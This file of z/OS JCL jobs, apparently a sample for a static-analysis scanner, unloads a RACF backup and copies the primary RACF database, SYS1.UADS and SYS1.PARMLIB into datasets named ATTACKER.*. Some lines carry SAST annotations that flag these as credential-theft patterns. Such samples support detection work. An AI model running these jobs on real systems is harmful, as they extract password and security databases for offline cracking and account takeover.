

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//RACFUNLD JOB 'RACFUNLD',
//             NOTIFY=&SYSUID,
//             CLASS=A,
//             MSGCLASS=X,
//             MSGLEVEL=(1,1),
//             REGION=6000K,
//             COND=(4,LT)
//UNLOAD   EXEC PGM=IRRDBU00,PARM=NOLOCKINPUT
//SYSPRINT DD SYSOUT=A,COPIES=1,DEST=U1018
//*
//INDD1    DD DISP=SHR,DSN=SYS1.RACFDS.BACKUP  
//OUTDD    DD DSN=CASE.RACF.FLATFILE,          
//            DISP=(NEW,CATLG,DELETE),
//            SPACE=(CYL,(70,10),RLSE),
//            DCB=(RECFM=FB,LRECL=4096,BLKSIZE=0)

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//COPYRACF JOB (AUDIT),'COPY RACF DB',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IDCAMS
//SYSPRINT DD SYSOUT=*
//RACFIN   DD DISP=SHR,DSN=SYS1.RACFDATA         <== SAST: RACF PRIMARY DB
//RACFOUT  DD DISP=(NEW,CATLG,DELETE),
//            DSN=ATTACKER.RACF.COPY,             <== SAST: USER-CONTROLLED DSN
//            SPACE=(TRK,(500,100)),
//            UNIT=SYSDA
//SYSIN    DD *
  REPRO INFILE(RACFIN) OUTFILE(RACFOUT)
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//UADSREAD JOB (AUDIT),'READ UADS',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IEBGENER
//SYSPRINT DD SYSOUT=*
//SYSUT1   DD DISP=SHR,DSN=SYS1.UADS             
//SYSUT2   DD DISP=(NEW,CATLG,DELETE),
//            DSN=ATTACKER.UADS.COPY,
//            SPACE=(TRK,(10,5)),
//            DCB=(RECFM=U,LRECL=0,BLKSIZE=6160)
//SYSIN    DD DUMMY

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//PARMBKUP JOB (AUDIT),'PARMLIB BACKUP',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IEBCOPY
//SYSPRINT DD SYSOUT=*
//INLIB    DD DISP=SHR,DSN=SYS1.PARMLIB           
//OUTLIB   DD DISP=(NEW,CATLG,DELETE),
//            DSN=ATTACKER.PARMLIB.COPY,
//            SPACE=(TRK,(100,20,50)),
//            DCB=(RECFM=FB,LRECL=80,BLKSIZE=3200)
//SYSIN    DD *
  COPY INDD=INLIB,OUTDD=OUTLIB
/*


